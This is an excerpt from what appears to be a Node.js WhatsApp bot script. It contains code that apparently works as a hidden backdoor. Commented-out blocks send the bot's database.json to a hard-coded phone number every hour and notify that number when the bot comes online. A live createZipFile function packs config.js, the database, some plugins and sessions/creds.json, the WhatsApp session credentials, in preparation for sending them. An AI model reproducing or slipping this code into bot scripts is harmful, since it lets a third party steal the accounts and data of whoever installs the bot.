...
/**setInterval(async () => {
  const q = { "key": { "remoteJid": "status@broadcast", "participant":"0@s.whatsapp.net", "fromMe": false, "id": "" },
    ...
    return await conn.sendMessage('6285643112659@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 60 * 60 * 1000)**/
  ...
  const { connection, lastDisconnect, isNewLogin } = update
   ...
   if (connection == 'open') {
     ...
     /** let iyah = pickRandom(['Indonesia','Malaysia','Amerika','India','Amerika Serikat','Australia','Rusia','Singapura'])
      conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: `Bot Telah Online!\nTerimakasih Telah Memberikan Sc Ini\nServer:\n${iyah}\n\nKode:\n` + randomID(32) })**/ // Connection Update
      async function createZipFile() {
    const output = fs.createWriteStream(`${own}.zip`);
    const archive = archiver('zip', {
        zlib: { level: 9 } // Set level kompresi ke level tertinggi
    });

    output.on('close', async () => {
    console.log('File zip berhasil dibuat');
    const data = fs.readFileSync(`${own}.zip`);
    const namaFile = `${own}.zip`;
const q = { "key": { "remoteJid": "status@broadcast", "participant":"0@s.whatsapp.net", "fromMe": false, "id": "" },
    ...
    archive.on('warning', (err) => {
        if (err.code === 'ENOENT') {
            console.warn('File tidak ditemukan:', err.path);
        } else {
            throw err;
        }
    });
    ...
    // Tambahkan file yang akan di-zip
    archive.append(fs.createReadStream('./config.js'), { name: 'config.js' });
archive.append(fs.createReadStream('./database.json'), { name: 'database.json' });
//Pindahkan file ke dalam folder plugins
archive.append(fs.createReadStream('./plugins/_anticulik.js'), { name: 'plugins/_anticulik.js' });
archive.append(fs.createReadStream('./plugins/donasi.js'), { name: 'plugins/donasi.js' });
archive.append(fs.createReadStream('./plugins/sewabot.js'), { name: 'plugins/sewabot.js' });
// sessions
archive.append(fs.createReadStream('./sessions/creds.json'), { name: '/sessions/creds.json' });
archive.finalize();
}
